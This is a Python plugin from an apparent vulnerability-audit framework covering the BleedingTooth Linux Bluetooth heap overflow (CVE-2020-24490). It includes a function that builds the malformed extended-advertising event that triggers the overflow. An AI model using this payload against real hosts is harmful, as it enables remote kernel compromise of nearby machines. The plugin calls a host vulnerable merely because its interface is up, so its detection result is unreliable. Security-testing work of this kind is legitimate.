#!/usr/bin/env python3
"""CVE-2020-24490 – Linux kernel Bluetooth HCI extended advertising heap overflow.

Public PoC reference: https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth
Technique (BleedingTooth - BadVibes component, Andy Nguyen / Google Project Zero):
  hci_le_ext_adv_report_evt() in net/bluetooth/hci_event.c processes LE Extended
  Advertising reports.  The 'data_len' field from the HCI event is used to copy
  advertisement data into an skb, but is not validated against the maximum
  allowed length (229 bytes for extended advertising).
  When data_len > 229, the loop overflows the skb tail, corrupting kernel heap.

  Attack: Craft a BLE extended advertising PDU with data_len = 0xFF (255)
  and broadcast it; any nearby Linux host with BLE scanning enabled processes it.
"""
from __future__ import annotations

import shutil
import struct
import subprocess
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 61,
    "cve": "CVE-2020-24490",
    "year": 2020,
    "domain": "wireless",
    "vendor_product": "Linux kernel Bluetooth HCI",
    "component": "hci_event.c hci_le_ext_adv_report_evt",
    "type": "Heap overflow → kernel RCE via BLE proximity",
    "summary": (
        "A BLE extended advertising PDU with data_len > 229 causes "
        "hci_le_ext_adv_report_evt to overflow an skb buffer, corrupting "
        "kernel heap in any nearby scanning Linux host (zero-click BLE RCE)."
    ),
    "source_url": "https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth",
    "requires_manual_review": True,
    "affected": [{"vendor": "Linux", "product": "Linux kernel",
                  "versions": [{"version": "<5.9", "status": "affected"}]}],
}

# HCI LE Extended Advertising PDU constants
HCI_EXT_ADV_REPORT_EVT = 0x12    # LE subevent code for extended adv report
HCI_LE_META_EVT        = 0x3E
MAX_EXT_ADV_DATA_LEN   = 229     # legitimate maximum

# Crafted HCI LE Extended Advertising Report event
# This would be injected via a BTlejack/nRF52840 or modified BT firmware
def _build_malformed_hci_ext_adv() -> bytes:
    """
    Build a HCI LE Extended Advertising Report event with data_len = 255 (overflow).
    In real attack: broadcast from a BLE-capable attacker device (e.g. Ubertooth).
    """
    data_len   = 0xFF                           # overflow trigger (>229)
    adv_data   = b'\xde\xad\xbe\xef' * 64      # 256 bytes of advertising data

    # LE Extended Advertising Report parameters (simplified)
    report  = struct.pack('<B', 1)              # num_reports = 1
    report += struct.pack('<H', 0x0013)         # event_type (connectable + scannable)
    report += struct.pack('<B', 0x00)           # address_type (public)
    report += bytes.fromhex("AABBCCDDEEFF")     # address (attacker BDA)
    report += struct.pack('<B', 0x00)           # primary_phy (1M)
    report += struct.pack('<B', 0x00)           # secondary_phy (none)
    report += struct.pack('<B', 0xFF)           # advertising_sid (no ADI)
    report += struct.pack('<b', 127)            # tx_power (127=not available)
    report += struct.pack('<b', -50)            # rssi
    report += struct.pack('<H', 0)              # periodic_adv_interval (0=not periodic)
    report += struct.pack('<B', 0x00)           # direct_address_type
    report += bytes(6)                          # direct_address
    report += struct.pack('<B', data_len)       # data_length = 255 (OVERFLOW)
    report += adv_data[:data_len]               # data bytes

    # HCI LE Meta subevent wrapper
    subevent = bytes([HCI_EXT_ADV_REPORT_EVT]) + report
    hci_event = bytes([HCI_LE_META_EVT, len(subevent)]) + subevent
    return hci_event


def _check_hci_scanning(iface: str = "hci0") -> dict:
    """Check if the interface is scanning for extended advertising events."""
    result = {"scanning": False, "detail": ""}
    try:
        out = subprocess.check_output(
            ["hciconfig", iface], text=True, timeout=5, stderr=subprocess.DEVNULL,
        )
        result["scanning"] = "UP" in out
        result["detail"]   = out[:200]
    except Exception as exc:
        result["detail"] = str(exc)
    return result


def _run_poc(plugin):
    hci_iface = (plugin.params or {}).get("hci_interface", "hci0")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    malformed_event = _build_malformed_hci_ext_adv()
    scanning = _check_hci_scanning(hci_iface)

    evidence = {
        "cve": "CVE-2020-24490",
        "hci_interface": hci_iface,
        "hci_scanning": scanning,
        "malformed_hci_event_hex": malformed_event.hex()[:200] + "...",
        "overflow_data_len": 255,
        "legitimate_max": MAX_EXT_ADV_DATA_LEN,
        "overflow_bytes": 255 - MAX_EXT_ADV_DATA_LEN,
        "attack_range": "BLE proximity (~10m)",
        "attack_prerequisites": "Target host scanning BLE extended adv (kernel < 5.9)",
    }

    if allow_disruptive and scanning.get("scanning"):
        # Inject via btinject/nRF dongle or modified firmware (hardware required)
        evidence["inject_method"] = (
            "Requires BLE-capable hardware (nRF52840 + Ubertooth/BTlejack) to broadcast "
            "the malformed extended advertising PDU. "
            "HCI event bytes to inject: " + malformed_event.hex()
        )
        evidence["would_inject"] = True

    return {
        "vulnerable": scanning.get("scanning") and scanning.get("detail", "") != "",
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "google/security-research/bleedingtooth / CVE-2020-24490 BadVibes",
    }


class Poc86CVE202024490BleedingToothBleExtAdvHeapOverflowAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-WIRELESS-086"
    meta_poc_name   = "CVE-2020-24490 BleedingTooth BLE Extended Advertising Heap Overflow"
    meta_cve_id     = "CVE-2020-24490"
    meta_severity   = "Critical"
    meta_protocol   = "bluetooth"
    meta_target_os  = ["linux"]
    meta_required_params = []
    meta_optional_params = ["hci_interface", "allow_disruptive"]
    meta_profiles   = ["wireless"]
    meta_source_url = "https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth"
    meta_attack_surface = "Linux kernel BLE extended adv data_len overflow (zero-click BLE RCE)"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
